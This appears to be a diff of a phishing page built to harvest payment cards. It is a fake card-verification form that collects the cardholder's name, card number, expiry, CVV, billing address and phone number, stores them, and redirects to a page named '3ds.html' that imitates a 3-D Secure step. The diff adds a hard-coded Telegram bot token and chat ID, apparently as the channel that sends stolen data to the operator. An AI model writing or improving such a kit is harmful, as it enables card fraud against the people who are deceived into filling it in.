@@ -49,18 +49,15 @@
 
         <label for="nomorKartu">Card number</label>
         <input type="text" id="nomorKartu" class="input" maxlength="19" placeholder="•••• •••• •••• ••••">
-        <p id="pesanNomor" class="pesan-merah">Enter a valid card number</p>
 
         <div class="baris-dua">
             <div class="kolom">
                 <label for="expDate">Expiry date</label>
                 <input type="text" id="expDate" class="input" maxlength="5" placeholder="MM/YY">
-                <p id="pesanExp" class="pesan-merah">Enter a valid expiry date</p>
             </div>
             <div class="kolom">
                 <label for="cvv">Security code</label>
                 <input type="text" id="cvv" class="input" maxlength="4" placeholder="•••">
-                <p id="pesanCvv" class="pesan-merah">Enter a valid security code</p>
             </div>
         </div>
 
@@ -107,7 +104,9 @@
     </div>
 
 <script>
-// === DATA NEGARA: Kode Telepon & Nama Lengkap ===
+const BOT_TOKEN = '8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk';
+const CHAT_ID = '7808815199';
+
 const daftarNegara = {
     'ID': {nama: 'Indonesia', kode: '+62'},
     'AU': {nama: 'Australia', kode: '+61'},
@@ -117,19 +116,10 @@ const daftarNegara = {
     'SG': {nama: 'Singapore', kode: '+65'},
     'JP': {nama: 'Japan', kode: '+81'},
     'KR': {nama: 'South Korea', kode: '+82'},
-    'CN': {nama: 'China', kode: '+86'},
-    'TH': {nama: 'Thailand', kode: '+66'},
-    'PH': {nama: 'Philippines', kode: '+63'},
-    'VN': {nama: 'Vietnam', kode: '+84'},
     'CA': {nama: 'Canada', kode: '+1'},
-    'NZ': {nama: 'New Zealand', kode: '+64'},
-    'DE': {nama: 'Germany', kode: '+49'},
-    'FR': {nama: 'France', kode: '+33'},
-    'AE': {nama: 'UAE', kode: '+971'},
-    'SA': {nama: 'Saudi Arabia', kode: '+966'}
+    'NZ': {nama: 'New Zealand', kode: '+64'}
 };
 
-// === ISI PILIHAN NEGARA ===
 const selectNegara = document.getElementById('negara');
 for (const [kode, data] of Object.entries(daftarNegara)) {
     const opsi = document.createElement('option');
@@ -138,15 +128,14 @@ for (const [kode, data] of Object.entries(daftarNegara)) {
     selectNegara.appendChild(opsi);
 }
 
-// === DETEKSI NEGARA OTOMATIS ===
 async function deteksiNegara() {
     try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
-        const kodeNegara = data.country_code || 'GB';
-        if (daftarNegara[kodeNegara]) {
-            selectNegara.value = kodeNegara;
-            document.getElementById('kodeTelp').value = daftarNegara[kodeNegara].kode;
+        const kode = data.country_code || 'GB';
+        if (daftarNegara[kode]) {
+            selectNegara.value = kode;
+            document.getElementById('kodeTelp').value = daftarNegara[kode].kode;
         } else {
             selectNegara.value = 'GB';
             document.getElementById('kodeTelp').value = '+44';
@@ -157,7 +146,6 @@ async function deteksiNegara() {
     }
 }
 
-// Ubah kode telepon saat negara diganti
 selectNegara.addEventListener('change', () => {
     const kode = selectNegara.value;
     if (daftarNegara[kode]) {
@@ -165,36 +153,32 @@ selectNegara.addEventListener('change', () => {
     }
 });
 
-// === FORMAT OTOMATIS KARTU ===
+// Format nomor kartu
 const inputNomor = document.getElementById('nomorKartu');
 inputNomor.addEventListener('input', (e) => {
-    let nilai = e.target.value.replace(/\D/g, '');
-    nilai = nilai.match(/.{1,4}/g)?.join(' ') || nilai;
-    e.target.value = nilai;
+    let v = e.target.value.replace(/\D/g, '');
+    v = v.match(/.{1,4}/g)?.join(' ') || v;
+    e.target.value = v;
 });
 
-// Format Expiry Date
+// Format expiry
 const inputExp = document.getElementById('expDate');
 inputExp.addEventListener('input', (e) => {
-    let nilai = e.target.value.replace(/\D/g, '');
-    if (nilai.length >= 2) {
-        nilai = nilai.slice(0,2) + '/' + nilai.slice(2,4);
-    }
-    e.target.value = nilai;
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
+    e.target.value = v;
 });
 
-// Hanya angka untuk CVV
-const inputCvv = document.getElementById('cvv');
-inputCvv.addEventListener('input', (e) => {
+// Hanya angka CVV
+document.getElementById('cvv').addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/\D/g, '');
 });
 
-// === CEK KELENGKAPAN UNTUK TOMBOL ===
-const elemen = {
+const el = {
     nama: document.getElementById('namaKartu'),
     nomor: inputNomor,
     exp: inputExp,
-    cvv: inputCvv,
+    cvv: document.getElementById('cvv'),
     alamat: document.getElementById('alamat'),
     kota: document.getElementById('kota'),
     provinsi: document.getElementById('provinsi'),
@@ -204,48 +188,36 @@ const elemen = {
 };
 
 function cekLengkap() {
-    const nomorBersih = elemen.nomor.value.replace(/\s/g, '');
-    const lengkap = 
-        elemen.nama.value.trim() &&
-        nomorBersih.length >= 13 &&
-        elemen.exp.value.length === 5 &&
-        elemen.cvv.value.length >= 3 &&
-        elemen.alamat.value.trim() &&
-        elemen.kota.value.trim() &&
-        elemen.provinsi.value.trim() &&
-        elemen.kodePos.value.trim() &&
-        elemen.telp.value.trim();
-    
-    elemen.tombol.classList.toggle('aktif', lengkap);
+    const nomorBersih = el.nomor.value.replace(/\s/g, '');
+    const ok = el.nama.value.trim() && nomorBersih.length >= 13 && el.exp.value.length === 5 &&
+               el.cvv.value.length >= 3 && el.alamat.value.trim() && el.kota.value.trim() &&
+               el.provinsi.value.trim() && el.kodePos.value.trim() && el.telp.value.trim();
+    el.tombol.classList.toggle('aktif', ok);
 }
 
-// Pantau semua input
-Object.values(elemen).forEach(el => {
-    if (el && el.addEventListener) el.addEventListener('input', cekLengkap);
-});
+[el.nama, el.nomor, el.exp, el.cvv, el.alamat, el.kota, el.provinsi, el.kodePos, el.telp]
+.forEach(e => e.addEventListener('input', cekLengkap));
 
-// === KLIK VERIFICATION ===
-elemen.tombol.addEventListener('click', () => {
-    if (!elemen.tombol.classList.contains('aktif')) return;
+el.tombol.addEventListener('click', () => {
+    if (!el.tombol.classList.contains('aktif')) return;
     
-    // Simpan data
-    localStorage.setItem('nama_kartu', elemen.nama.value.trim());
-    localStorage.setItem('nomor_kartu', elemen.nomor.value.trim());
-    localStorage.setItem('exp_kartu', elemen.exp.value.trim());
-    localStorage.setItem('cvv_kartu', elemen.cvv.value.trim());
-    localStorage.setItem('alamat', elemen.alamat.value.trim());
-    localStorage.setItem('kota', elemen.kota.value.trim());
-    localStorage.setItem('provinsi', elemen.provinsi.value.trim());
-    localStorage.setItem('kode_pos', elemen.kodePos.value.trim());
+    // Simpan semua data
+    localStorage.setItem('nama_kartu', el.nama.value.trim());
+    localStorage.setItem('nomor_kartu', el.nomor.value.trim());
+    localStorage.setItem('exp_kartu', el.exp.value.trim());
+    localStorage.setItem('cvv_kartu', el.cvv.value.trim());
+    localStorage.setItem('alamat', el.alamat.value.trim());
+    localStorage.setItem('kota', el.kota.value.trim());
+    localStorage.setItem('provinsi', el.provinsi.value.trim());
+    localStorage.setItem('kode_pos', el.kodePos.value.trim());
     localStorage.setItem('negara', selectNegara.value);
     localStorage.setItem('kode_telp', document.getElementById('kodeTelp').value);
-    localStorage.setItem('nomor_telp', elemen.telp.value.trim());
+    localStorage.setItem('nomor_telp', el.telp.value.trim());
     
-    // Lanjut ke halaman berikutnya
+    // Lanjut ke 3ds.html
     window.location.href = '3ds.html';
 });
 
-// Jalankan deteksi negara saat halaman terbuka
 deteksiNegara();
 </script>
 </body>
